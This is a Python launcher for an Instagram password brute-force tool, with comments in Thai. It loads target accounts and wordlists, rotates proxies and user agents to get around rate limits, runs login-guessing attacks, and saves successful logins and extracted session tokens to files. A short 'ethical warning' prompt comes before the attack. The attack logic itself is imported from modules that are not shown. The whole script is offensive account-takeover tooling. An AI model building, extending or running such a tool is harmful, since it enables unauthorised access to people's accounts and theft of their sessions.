#!/usr/bin/env python3
"""
🚀 Advanced Instagram Brute Force with Proxy Support
รันระบบ brute force พร้อม proxy rotation และ advanced features
"""

import time
import json
import sys
from datetime import datetime
from pathlib import Path

from brute_force import InstagramBruteForce
from modules.proxy_manager import ProxyManager

def banner():
    """แสดง banner"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                 🔓 ADVANCED INSTAGRAM BRUTE FORCE           ║
║                     with Proxy Support                      ║
╠══════════════════════════════════════════════════════════════╣
║  ⚡ Features:                                                ║
║  • Bright Data Proxy Integration                            ║
║  • Automatic Proxy Rotation                                 ║
║  • Rate Limit Detection & Handling                          ║
║  • User Agent Rotation                                      ║
║  • Session Extraction                                       ║
║  • Discord Notifications                                    ║
╚══════════════════════════════════════════════════════════════╝
""")

def check_prerequisites():
    """ตรวจสอบความพร้อมของระบบ"""
    print("🔍 Checking system prerequisites...")
    
    issues = []
    
    # ตรวจสอบไฟล์ config หลัก
    if not Path("brute_config.json").exists():
        issues.append("❌ brute_config.json not found")
    else:
        print("✅ brute_config.json found")
    
    # ตรวจสอบไฟล์ proxy config
    if not Path("proxy_config.json").exists():
        issues.append("❌ proxy_config.json not found")
    else:
        print("✅ proxy_config.json found")
    
    # ตรวจสอบ wordlists
    try:
        with open("brute_config.json", "r") as f:
            config = json.load(f)
            wordlists = config.get("wordlists", [])
            
            for wordlist in wordlists:
                if Path(wordlist).exists():
                    print(f"✅ Wordlist found: {wordlist}")
                else:
                    issues.append(f"❌ Wordlist not found: {wordlist}")
    except Exception as e:
        issues.append(f"❌ Error reading config: {e}")
    
    return issues

def test_proxy_connection():
    """ทดสอบการเชื่อมต่อ proxy"""
    print("\n🌐 Testing proxy connection...")
    
    try:
        proxy_manager = ProxyManager()
        if proxy_manager.test_connection():
            print("✅ Proxy connection successful!")
            return True
        else:
            print("❌ Proxy connection failed!")
            return False
    except Exception as e:
        print(f"❌ Proxy test error: {e}")
        return False

def show_config_summary():
    """แสดงสรุปการตั้งค่า"""
    print("\n📋 Configuration Summary:")
    print("-" * 50)
    
    try:
        # อ่าน brute config
        with open("brute_config.json", "r") as f:
            brute_config = json.load(f)
        
        print(f"🎯 Targets: {len(brute_config.get('targets', []))}")
        print(f"📝 Wordlists: {len(brute_config.get('wordlists', []))}")
        print(f"⏱️ Request delay: {brute_config.get('request_delay', 'Unknown')} seconds")
        print(f"🔄 Max attempts per target: {brute_config.get('max_attempts', 'Unknown')}")
        print(f"🌐 Use proxy: {'✅' if brute_config.get('use_proxy') else '❌'}")
        print(f"🔄 Proxy rotation interval: {brute_config.get('proxy_rotation_interval', 'Unknown')}")
        
        # แสดง targets
        targets = brute_config.get('targets', [])
        if targets:
            print(f"\n🎯 Target list:")
            for i, target in enumerate(targets[:5], 1):  # แสดงแค่ 5 ตัวแรก
                if isinstance(target, dict):
                    identifier = target.get('identifier', 'Unknown')
                    target_type = target.get('type', 'Unknown')
                    print(f"   {i}. {identifier} ({target_type})")
                else:
                    print(f"   {i}. {target}")
            
            if len(targets) > 5:
                print(f"   ... and {len(targets) - 5} more targets")
        
        # อ่าง proxy config
        try:
            with open("proxy_config.json", "r") as f:
                proxy_config = json.load(f)
            
            print(f"\n🌐 Proxy configuration:")
            print(f"   Host: {proxy_config.get('proxy_host', 'Unknown')}")
            print(f"   Port: {proxy_config.get('proxy_port', 'Unknown')}")
            print(f"   Enabled: {'✅' if proxy_config.get('enabled') else '❌'}")
            print(f"   Rotation: {'✅' if proxy_config.get('rotation_enabled') else '❌'}")
            
        except Exception as e:
            print(f"❌ Error reading proxy config: {e}")
            
    except Exception as e:
        print(f"❌ Error reading configuration: {e}")

def confirm_execution():
    """ยืนยันการรัน"""
    print("\n⚠️ ETHICAL WARNING:")
    print("=" * 50)
    print("🔒 This tool should ONLY be used for:")
    print("   • Testing YOUR OWN accounts")
    print("   • Authorized penetration testing")
    print("   • Educational purposes with consent")
    print("")
    print("❌ DO NOT use this tool for:")
    print("   • Attacking other people's accounts")
    print("   • Unauthorized access attempts")
    print("   • Any illegal activities")
    print("")
    print("⚖️ You are responsible for compliance with all applicable laws.")
    print("=" * 50)
    
    while True:
        response = input("\n❓ Do you confirm ethical usage and want to proceed? (yes/no): ").lower().strip()
        
        if response in ['yes', 'y']:
            return True
        elif response in ['no', 'n']:
            print("❌ Operation cancelled by user.")
            return False
        else:
            print("❌ Please enter 'yes' or 'no'")

def run_brute_force():
    """รันการ brute force"""
    print("\n🚀 Starting Instagram Brute Force Attack...")
    print("=" * 50)
    
    try:
        # สร้าง brute force instance
        brute_force = InstagramBruteForce()
        
        # อ่าน targets จาก config
        targets = []
        wordlists = []
        
        # ดึง targets
        config_targets = brute_force.config.get('targets', [])
        for target in config_targets:
            if isinstance(target, dict):
                targets.append(target.get('identifier'))
            else:
                targets.append(target)
        
        # ดึง wordlists
        wordlists = brute_force.config.get('wordlists', [])
        
        if not targets:
            print("❌ No targets found in configuration!")
            print("💡 Add targets to brute_config.json")
            return False
        
        if not wordlists:
            print("❌ No wordlists found in configuration!")
            print("💡 Add wordlists to brute_config.json")
            return False
        
        print(f"🎯 Loaded {len(targets)} targets")
        print(f"📝 Using {len(wordlists)} wordlists")
        
        # เริ่มการโจมตี
        start_time = datetime.now()
        results = brute_force.run_brute_force(targets, wordlists)
        end_time = datetime.now()
        
        # แสดงผลลัพธ์
        duration = end_time - start_time
        summary = results.get('summary', {})
        
        print("\n" + "=" * 60)
        print("📊 ATTACK COMPLETED!")
        print("=" * 60)
        print(f"⏱️ Duration: {duration}")
        print(f"🎯 Targets tested: {summary.get('total_targets', 0)}")
        print(f"✅ Successful logins: {summary.get('successful_logins', 0)}")
        print(f"🔑 Total attempts: {summary.get('total_attempts', 0)}")
        print(f"💾 Results saved to: {brute_force.config.get('output_file', 'brute_results.json')}")
        
        if brute_force.successful_sessions:
            print(f"🔓 Sessions extracted: {len(brute_force.successful_sessions)}")
            print(f"💾 Sessions saved to: {brute_force.config.get('session_output', 'extracted_sessions.json')}")
        
        # แสดงสถิติ proxy
        total_rotations = 0
        total_rate_limits = 0
        
        for result in results.get('results', []):
            total_rotations += result.get('proxy_rotations', 0)
            total_rate_limits += result.get('rate_limits_hit', 0)
        
        print(f"🔄 Total proxy rotations: {total_rotations}")
        print(f"⚠️ Rate limits encountered: {total_rate_limits}")
        
        return True
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Attack interrupted by user!")
        print("💾 Partial results may be saved in output files.")
        return False
    except Exception as e:
        print(f"\n❌ Error during attack: {e}")
        return False

def main():
    """ฟังก์ชันหลัก"""
    banner()
    
    # ตรวจสอบความพร้อม
    issues = check_prerequisites()
    if issues:
        print("\n❌ System not ready:")
        for issue in issues:
            print(f"   {issue}")
        print("\n💡 Please fix these issues before running.")
        sys.exit(1)
    
    # ทดสอบ proxy
    if not test_proxy_connection():
        print("\n⚠️ Proxy connection failed!")
        response = input("Continue without proxy? (yes/no): ").lower().strip()
        if response not in ['yes', 'y']:
            print("❌ Operation cancelled.")
            sys.exit(1)
    
    # แสดงสรุปการตั้งค่า
    show_config_summary()
    
    # ยืนยันการรัน
    if not confirm_execution():
        sys.exit(0)
    
    # รัน brute force
    success = run_brute_force()
    
    if success:
        print("\n🎉 Operation completed successfully!")
        print("\n📁 Check output files for results:")
        print("   • brute_results.json - Full attack results")
        print("   • extracted_sessions.json - Successful sessions")
    else:
        print("\n❌ Operation failed or was interrupted.")
    
    print("\n🔒 Remember to use this tool ethically and responsibly!")

if __name__ == "__main__":
    main()
